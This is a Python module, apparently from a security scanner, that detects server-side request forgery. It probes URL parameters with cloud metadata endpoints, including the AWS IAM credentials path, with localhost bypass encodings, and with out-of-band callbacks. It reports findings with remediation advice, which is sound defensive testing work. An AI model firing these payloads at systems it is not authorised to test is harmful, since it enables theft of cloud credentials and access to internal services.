"""Module 8 — SSRF Comprehensive Detector.

Tests for direct SSRF (cloud metadata), blind SSRF (OOB), and SSRF bypass
techniques including octal/decimal IP encoding and DNS rebinding hints.
"""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Any

from phantomscan.http_client import RobustHTTPClient
from phantomscan.oob import oob_listener

logger = logging.getLogger(__name__)

CLOUD_METADATA_URLS = [
    ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", {}),
    ("AWS IMDSv1 Creds",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    ("GCP", "http://metadata.google.internal/computeMetadata/v1/",
     {"Metadata-Flavor": "Google"}),
    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     {"Metadata": "true"}),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1/", {}),
]

SSRF_BYPASS_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",          # octal
    "http://2130706433",           # decimal
    "http://127.1",
    "http://0x7f.0x0.0x0.0x1",    # hex
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
]

_URL_PARAM_NAMES = frozenset({
    "url", "uri", "href", "src", "source", "redirect", "next",
    "return", "target", "dest", "destination", "link", "file",
    "path", "page", "feed", "fetch", "endpoint", "callback",
    "load", "host", "domain", "proxy", "site", "img", "image",
})

_METADATA_SIGNALS = {
    "AWS": ["ami-id", "instance-id", "iam", "security-credentials", "meta-data"],
    "GCP": ["computeMetadata", "project-id", "instance/zone", "service-accounts"],
    "Azure": ["compute", "vmId", "subscriptionId", "resourceGroupName"],
    "DigitalOcean": ["droplet_id", "hostname", "region"],
}


class SSRFDetector:
    """Detect SSRF vulnerabilities including cloud metadata exposure."""

    def __init__(self, http: RobustHTTPClient) -> None:
        self.http = http

    async def run(
        self,
        base_url: str,
        observations: list[dict[str, Any]],
        **kwargs: Any,
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        target = base_url.rstrip("/")
        url_params = self._find_url_params(target, observations)

        for param_info in url_params[:15]:
            url = param_info["url"]
            param = param_info["name"]

            # Test 1: Cloud metadata via SSRF
            meta_findings = await self._test_cloud_metadata(url, param)
            findings.extend(meta_findings)

            # Test 2: SSRF bypass techniques
            bypass_findings = await self._test_ssrf_bypass(url, param)
            findings.extend(bypass_findings)

            # Test 3: Blind SSRF via OOB
            oob_findings = await self._test_blind_ssrf(url, param)
            findings.extend(oob_findings)

        return findings

    async def _test_cloud_metadata(
        self, url: str, param: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for provider, meta_url, extra_headers in CLOUD_METADATA_URLS:
            try:
                response = await self.http.get(
                    url, params={param: meta_url},
                    headers=extra_headers, retries=1,
                )
                body = response.text()
                if response.status == 200 and self._contains_metadata(body, provider):
                    findings.append({
                        "id": f"SSRF-CLOUD-{provider.split()[0].upper()}",
                        "title": f"SSRF — {provider} Cloud Metadata Exposed",
                        "severity": "critical",
                        "confidence": "high",
                        "category": "ssrf",
                        "target": url,
                        "evidence": (
                            f"Parameter: {param}\n"
                            f"Metadata URL: {meta_url}\n"
                            f"Response preview: {body[:500]}"
                        ),
                        "recommendation": (
                            f"Block SSRF access to cloud metadata services. "
                            f"For AWS, enforce IMDSv2 (require token). "
                            f"Validate and allowlist all user-supplied URLs. "
                            f"CWE-918, OWASP A10:2021."
                        ),
                        "references": [
                            "https://cwe.mitre.org/data/definitions/918.html",
                            "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                        ],
                    })
                    return findings  # one cloud metadata finding is sufficient
            except Exception:
                continue
        return findings

    async def _test_ssrf_bypass(
        self, url: str, param: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for bypass_url in SSRF_BYPASS_PAYLOADS:
            try:
                response = await self.http.get(
                    url, params={param: bypass_url},
                    retries=1,
                )
                body = response.text()
                if response.status == 200 and len(body) > 100 and (
                    "html" in body.lower() or "server" in body.lower()
                    or "apache" in body.lower() or "nginx" in body.lower()
                ):
                    findings.append({
                        "id": "SSRF-BYPASS-INTERNAL",
                        "title": "SSRF Bypass — Internal Service Accessible",
                        "severity": "high",
                        "confidence": "medium",
                        "category": "ssrf",
                        "target": url,
                        "evidence": (
                            f"Parameter: {param}\n"
                            f"Bypass URL: {bypass_url}\n"
                            f"Response: HTTP {response.status} "
                            f"({len(response.body)} bytes). "
                            f"Internal service content detected."
                        ),
                        "recommendation": (
                            "Implement strict URL validation with allowlists. "
                            "Block all private IP ranges including alternative "
                            "encodings (octal, decimal, hex). CWE-918."
                        ),
                        "references": ["https://cwe.mitre.org/data/definitions/918.html"],
                    })
                    return findings  # one bypass finding is enough
            except Exception:
                continue
        return findings

    async def _test_blind_ssrf(
        self, url: str, param: str
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        if not oob_listener.is_running:
            try:
                oob_listener.start()
            except Exception:
                return findings

        uid, callback_url = oob_listener.generate_payload_url()
        try:
            await self.http.get(url, params={param: callback_url}, retries=1)
        except Exception:
            pass

        await asyncio.sleep(5)

        if oob_listener.check_hit(uid):
            findings.append({
                "id": "SSRF-BLIND-OOB",
                "title": "Blind SSRF Confirmed",
                "severity": "high",
                "confidence": "high",
                "category": "ssrf",
                "target": url,
                "evidence": (
                    f"Parameter: {param}\n"
                    f"OOB callback received from target server."
                ),
                "recommendation": (
                    "Restrict outbound requests. Use URL allowlists. "
                    "Block private IP ranges and cloud metadata endpoints. "
                    "CWE-918."
                ),
                "references": ["https://cwe.mitre.org/data/definitions/918.html"],
            })
        return findings

    def _find_url_params(
        self, target: str, observations: list[dict[str, Any]]
    ) -> list[dict[str, Any]]:
        params: list[dict[str, Any]] = []
        seen: set[tuple[str, str]] = set()
        for obs in observations:
            val = obs.get("value", "")
            if isinstance(val, str) and val.startswith("http"):
                for name in _URL_PARAM_NAMES:
                    key = (val, name)
                    if key not in seen:
                        seen.add(key)
                        params.append({"url": val, "name": name})
        # Fallback: generate common paths
        if not params:
            for path in ("/api/fetch", "/api/proxy", "/api/load", "/redirect"):
                for name in ("url", "src", "target", "dest"):
                    params.append({"url": f"{target}{path}", "name": name})
        return params

    @staticmethod
    def _contains_metadata(body: str, provider: str) -> bool:
        signals = _METADATA_SIGNALS.get(provider.split()[0], [])
        return any(s.lower() in body.lower() for s in signals)
